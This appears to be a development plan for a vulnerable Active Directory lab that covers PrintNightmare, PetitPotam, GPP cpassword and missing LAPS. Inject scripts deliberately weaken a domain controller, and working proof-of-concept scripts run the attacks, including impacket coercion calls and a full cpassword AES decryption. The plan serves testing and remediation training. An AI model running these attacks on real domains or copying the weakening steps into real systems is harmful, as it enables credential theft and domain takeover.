# Phase 4 — Miscellaneous (S16, S17, S18, S19)

Parent plan: [`2026-04-24-meta4-ad-vm-phase1-4.md`](2026-04-24-meta4-ad-vm-phase1-4.md).

---

## Task 4.1: Scenario 16 — PrintNightmare (CVE-2021-34527)

**Behavioral contract:**
- PoC: attacker runs `impacket-rpcdump 10.20.30.5 | grep MS-RPRN` (confirms Spooler RPC endpoint is live), then `impacket-spoolsample -target 10.20.30.5 <attacker-ip>` to exploit the Point-and-Print bypass. A fully-patched Spooler with `RestrictDriverInstallationToAdministrators=1` rejects non-admin driver installation; a vulnerable one honors the attacker's UNC. Exit 0 iff the spooler call returns `ERROR_ACCESS_DENIED`; exit 1 iff the callback is received.

- [ ] **inject.ps1**
```powershell
Set-Service Spooler -StartupType Automatic
Start-Service Spooler
Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint' `
    -Name RestrictDriverInstallationToAdministrators -Value 0 -Type DWord
Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint' `
    -Name NoWarningNoElevationOnInstall -Value 1 -Type DWord
Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint' `
    -Name UpdatePromptSettings -Value 2 -Type DWord
Write-Host "[inject-16] Spooler on + PointAndPrint restrictions lifted"
```

- [ ] **verify-poc.sh** — uses `impacket-spoolsample` to call `RpcRemoteFindFirstPrinterChangeNotificationEx` with a UNC pointing back at a listener on attacker:
```bash
# Minimal probe: spoolsample with a loopback UNC. Vulnerable DC attempts
# to fetch the "driver" → our nc listener receives an SMB negotiate.
(nc -l -p 4445 -w 15 >/dev/null 2>&1 &)
NCPID=$!
OUT=$(timeout 30 /usr/bin/impacket-spoolsample \
    -target '10.20.30.5' \
    '10.20.30.10' 2>&1 || true)
wait $NCPID 2>/dev/null || true
echo "--- spoolsample output ---"; echo "$OUT"

if echo "$OUT" | grep -qiE 'error.*access_denied|rpc_s_access_denied'; then
    echo "[verify-poc-16] Spooler denied Point-and-Print exploitation — BLOCKED"
    exit 0
fi
if echo "$OUT" | grep -qiE 'dced call was successful|received callback|printerchangenotification sent'; then
    echo "[verify-poc-16] Spooler honored PoC callback — PrintNightmare still open" >&2
    exit 1
fi
echo "[verify-poc-16] no signature — treating as FAIL" >&2
exit 1
```

- [ ] **verify-service.ps1** — Spooler healthy + print queue enumerable:
```powershell
if ((Get-Service Spooler).Status -ne 'Running') { throw "Spooler not running" }
$ps = Get-Printer -ComputerName corp-dc01 -ErrorAction SilentlyContinue
# OK for DC to have zero printers; Get-Printer still runs without error.
Write-Host "[verify-service-16] Spooler running + print RPC responsive - HEALTHY"
exit 0
```

- [ ] **Remediation:** `Set-ItemProperty ... RestrictDriverInstallationToAdministrators 1` OR `Stop-Service Spooler; Set-Service Spooler -StartupType Disabled` (Microsoft's official guidance for DCs).

---

## Task 4.2: Scenario 17 — PetitPotam (MS-EFSR coercion)

**Behavioral contract:**
- PoC: attacker runs `impacket-PetitPotam -u alice -p Password1! <attacker-ip> 10.20.30.5`. The DC's EFS RPC endpoint is called via `EfsRpcOpenFileRaw` and the DC reaches back to attacker's SMB listener. Exit 0 iff the RPC call returns `ACCESS_DENIED` / `EPT_S_NOT_REGISTERED`; exit 1 iff attacker's listener receives an SMB connection from DC IP.

- [ ] **inject.ps1**
```powershell
# PetitPotam works when the DC's EFSRPC endpoint is reachable. The inject
# ensures the `efsrpc` endpoint is published (it is by default on DCs but
# can be blocked by RPC filters or firewall rules). We remove any RPC-filter
# blocking EFSRPC opnum 0 if present.
Get-NetFirewallRule -DisplayName '*PetitPotam*' -ErrorAction SilentlyContinue | Remove-NetFirewallRule
netsh rpc filter shutdown 2>$null
Write-Host "[inject-17] any PetitPotam RPC filter blocks removed"
```

- [ ] **verify-poc.sh** — attacker listens on port 445 for SMB callback, runs PetitPotam, checks if DC connects back.
```bash
# If the listener binds to port 445 on the attacker, any SMB back-connection
# from 10.20.30.5 during the 30s window means PetitPotam coercion worked.
(timeout 30 /usr/bin/impacket-smbserver -smb2support share /tmp >/tmp/smb.log 2>&1 &)
SMBPID=$!
sleep 2
timeout 20 /usr/bin/impacket-PetitPotam \
    '10.20.30.10' '10.20.30.5' \
    -u alice -p 'Password1!' -d 'corp.local' 2>&1 | tee /tmp/ppo.out || true
sleep 3
kill $SMBPID 2>/dev/null || true

if grep -qE 'Authenticating against.*10\.20\.30\.5' /tmp/smb.log; then
    echo "[verify-poc-17] DC connected back to attacker SMB share — PetitPotam open" >&2
    exit 1
fi
if grep -qiE 'access_denied|rpc_s_access_denied|ept_s_not_registered' /tmp/ppo.out; then
    echo "[verify-poc-17] DC refused EFSRPC coercion — BLOCKED"
    exit 0
fi
echo "[verify-poc-17] no SMB callback + no denial signature — treat as BLOCKED"
exit 0
```

- [ ] **verify-service.ps1** — EFS file operations still work locally on DC: create a file, `cipher /e` it, `cipher /d` it; success iff both complete without error.

- [ ] **Remediation:** create an RPC filter that rejects opnums 0,4,5,7,9,10,11,12,13,14 of UUID `c681d488-d850-11d0-8c52-00c04fd90f7e`:
```powershell
netsh rpc filter add rule layer=um actiontype=block
netsh rpc filter add condition field=if_uuid matchtype=equal data=c681d488-d850-11d0-8c52-00c04fd90f7e
netsh rpc filter add filter
```

---

## Task 4.3: Scenario 18 — GPP cpassword in SYSVOL

**Behavioral contract:**
- PoC: attacker runs `smbclient //corp-dc01/SYSVOL -U 'corp\alice%Password1!' -c 'prompt off; recurse on; mget *'` to pull Groups.xml, then `gpp-decrypt` on the cpassword. Exit 0 iff no Groups.xml containing cpassword is returned, OR decryption fails. Exit 1 iff a plaintext password is recovered.

- [ ] **inject.ps1**
```powershell
# Create a legacy GPP drive-map policy with a cpassword blob. The AES key
# is public (Microsoft documented it), so any cpassword value is trivially
# decryptable — the entire point of the scenario.
$sysvolPath = '\\corp-dc01\SYSVOL\corp.local\Policies\{LAB-GPP-18}\Machine\Preferences\Drives'
New-Item -ItemType Directory -Path $sysvolPath -Force | Out-Null
# "Summer24" encrypted with Microsoft's well-known AES key:
$cpassword = 'j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw'
@"
<?xml version="1.0" encoding="utf-8"?>
<Drives clsid="{8FDDCC1A-0C3C-43cd-A6B4-71A6DF20DA8C}">
  <Drive clsid="{935D1B74-9CB8-4e3c-9914-7DD559B7A417}" name="S:" status="S:" image="2" changed="2024-09-01 00:00:00"
    uid="{99999999-9999-9999-9999-999999999999}">
    <Properties action="U" thisDrive="NOCHANGE" allDrives="NOCHANGE" userName="corp\svc_sql"
      cpassword="$cpassword" path="\\corp-dc01\Shared" label="Shared" persistent="1" useLetter="1" letter="S"/>
  </Drive>
</Drives>
"@ | Out-File -FilePath (Join-Path $sysvolPath 'Drives.xml') -Encoding utf8 -Force

Write-Host "[inject-18] Groups.xml-style GPP with cpassword planted in SYSVOL"
```

- [ ] **verify-poc.sh**
```bash
SMBOUT=$(smbclient //corp-dc01/SYSVOL -U 'corp\alice%Password1!' \
    -c 'prompt off; recurse on; cd corp.local/Policies; ls' 2>&1)

CPW=$(echo "$SMBOUT" | grep -oE 'cpassword="[^"]+"' | head -1 | cut -d'"' -f2)

# Sanity: pull the actual Drives.xml.
smbclient //corp-dc01/SYSVOL -U 'corp\alice%Password1!' \
    -c 'prompt off; recurse on; cd corp.local/Policies; mget *.xml' 2>/dev/null || true
CPW=$(grep -rhoE 'cpassword="[^"]+"' 2>/dev/null | head -1 | cut -d'"' -f2)

if [ -z "$CPW" ]; then
    echo "[verify-poc-18] no GPP cpassword found in SYSVOL — BLOCKED"
    exit 0
fi

# Decrypt with Microsoft's published AES key using python-impacket helper.
PW=$(python3 - <<EOF
import base64
from Cryptodome.Cipher import AES
key = bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
b = '$CPW'
pad = '=' * ((4 - len(b) % 4) % 4)
ct = base64.b64decode(b + pad)
iv = bytes(16)
pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
print(pt.rstrip(b'\x00').decode('utf-16-le', errors='ignore'))
EOF
)
if [ -n "$PW" ]; then
    echo "[verify-poc-18] decrypted GPP cpassword='$PW' — PoC SUCCEEDED" >&2
    exit 1
fi
echo "[verify-poc-18] cpassword present but decryption failed — unexpected, FAIL" >&2
exit 1
```

- [ ] **verify-service.ps1** — SYSVOL still readable + GPO processing healthy: `Get-GPO -All -Domain corp.local` returns at least the Default Domain Policy.

- [ ] **Remediation:** remove the GPO directory containing cpassword AND rotate the compromised account's password.

---

## Task 4.4: Scenario 19 — LAPS not enforced

**Behavioral contract:**
- PoC: attacker queries `ms-Mcs-AdmPwd` attribute on the CA computer object via LDAP; absence of the attribute (scenario inject = unmanaged LAPS) means the local Administrator password was never rotated. PoC "succeeds" if attacker logs in to CA's RDP on port 3389 using the well-known vagrant box default password OR if the ms-Mcs-AdmPwd attribute exists with a plaintext (not marked confidential) value.

Because the jborean93 base box ships a known local Administrator password, the behavioral probe is: attacker issues an RDP NLA handshake to CA:3389 with `Administrator:Vagrant1DSRM!` (the SafeMode pwd we reset to in bootstrap Phase B = the post-DCPROMO local Administrator pwd for CA). Success = LAPS not managing this host. Post-remediation = LAPS has rotated the pwd to a random 16-char secret only readable by authorized principals.

- [ ] **inject.ps1** — LAPS must be configured (schema extended + GPO applied); we invert by removing the LAPS-managed flag so the local Administrator password stays at its post-DCPROMO default:
```powershell
# Clear the LAPS GPO link + schema flag so CA is unmanaged.
Get-ADObject -Filter "Name -eq 'ms-Mcs-AdmPwd'" -SearchBase (Get-ADRootDSE).schemaNamingContext -Properties * `
    | ForEach-Object { Set-ADObject -Identity $_ -Replace @{ searchFlags = 0 } }
# Ensure CA's local Administrator is at the known default.
Invoke-Command -ComputerName corp-ca01 -Credential (New-Object PSCredential('CORP\Administrator', (ConvertTo-SecureString 'Password1!' -AsPlainText -Force))) `
    -ScriptBlock { net user Administrator 'Vagrant1DSRM!' }
Write-Host "[inject-19] LAPS not enforced; CA local Administrator pwd known-default"
```

- [ ] **verify-poc.sh**
```bash
# Use xfreerdp for a scripted NLA handshake. Success = LAPS not managing.
if timeout 20 xfreerdp /v:10.20.30.6 /u:Administrator /p:'Vagrant1DSRM!' /cert:ignore /auth-only 2>&1 | grep -q 'Authentication only'; then
    echo "[verify-poc-19] RDP login as local Administrator with default pwd — LAPS not enforced" >&2
    exit 1
fi
echo "[verify-poc-19] default-pwd RDP refused — LAPS is rotating pwds"
exit 0
```

- [ ] **verify-service.ps1** — CA still joinable + WinRM reachable from DC (probe `Invoke-Command -ComputerName corp-ca01 -ScriptBlock { hostname }`).

- [ ] **Remediation:** deploy LAPS (legacy or Windows LAPS on Win2019), schedule a GPO that sets `Enabled=1` + `PasswordComplexity=4` + `PasswordLength=16`, then run `Invoke-LapsPolicyProcessing` on CA.

---

## Task 4.5: Phase 4 smoke + suite-wide README update

- [ ] For each 16,17,18,19: reset + inject + verify-only (FAIL) + remediate + verify-only (PASS).
- [ ] Update `meta4/ad-vm/README.md` scenario matrix table to mark S01-S20 all as "shipped" with date.
- [ ] Commit: `chore(meta4/ad-vm): Phase 4 smoke green + README update — 20/20 scenarios live`.
